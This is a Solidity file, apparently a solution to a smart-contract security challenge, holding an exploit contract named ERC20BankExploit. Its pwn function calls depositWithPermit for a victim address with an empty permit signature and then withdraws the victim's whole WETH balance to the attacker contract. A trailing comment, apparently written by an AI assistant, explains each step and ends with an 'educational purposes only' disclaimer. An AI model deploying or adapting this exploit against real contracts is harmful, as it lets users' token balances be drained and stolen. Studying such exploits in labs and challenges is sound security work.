// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// Import interfaces
interface IERC20 {
    function balanceOf(address account) external view returns (uint);
}

interface IERC20Bank {
    function token() external view returns (address);

    function deposit(uint amount) external;

    function depositWithPermit(
        address owner,
        address spender,
        uint amount,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function withdraw(uint amount) external;
}

contract ERC20BankExploit {
    address private immutable target;

    constructor(address _target) {
        target = _target;
    }

    function pwn(address alice) external {
        // Write your code here
        address weth = IERC20Bank(target).token();
        uint bal = IERC20(weth).balanceOf(alice);

        // Exploit: Deposit the entire balance of WETH into the target contract
        IERC20Bank(target).depositWithPermit(
            alice,        // Owner
            address(this), // Spender (this contract)
            bal,          // Amount to deposit (full balance)
            0,            // Deadline
            0,            // v
            "",           // r
            ""            // s
        );

        // Exploit: Immediately withdraw the deposited WETH back to this contract
        IERC20Bank(target).withdraw(bal);
    }
}

/*
Explanation of the code:

The "ERC20BankExploit" contract you provided appears to exploit a potential vulnerability in a target contract that implements the "IERC20Bank" interface. This exploit allows an attacker to perform specific actions using the "depositWithPermit" and "withdraw" functions. Let's break down the code step by step:


1. The "ERC20BankExploit" contract takes the address of a target contract as a constructor parameter and stores it as an immutable variable.

2. The "pwn" function is an external function that performs the exploit:
   - It gets the address of the ERC20 token ("WETH") used by the target contract by calling the "token()" function of the "IERC20Bank" interface.
   - It retrieves the balance of the "alice" address in the WETH token using the "balanceOf" function of the "IERC20" interface and stores it in the "bal" variable.

3. The exploit part:
   - It calls the "depositWithPermit" function of the target contract to deposit the entire balance of WETH from "alice" into the target contract. This is done using "alice" as the owner, the address of this contract as the spender, and the full balance as the deposit amount. No permit signature is provided (empty signature fields).
   - Immediately after depositing, it calls the "withdraw" function of the target contract to withdraw the same amount of WETH back to this contract.

The exploit allows an attacker to essentially move the WETH balance from "alice" to the attacker's control through the target contract, effectively draining "alice's" WETH balance to the attacker's address.

Please note that this code is provided for educational purposes only and should not be used for malicious activities on the Ethereum network. Exploiting vulnerabilities in smart contracts is unethical and may be illegal. Always adhere to responsible and ethical coding practices.
*/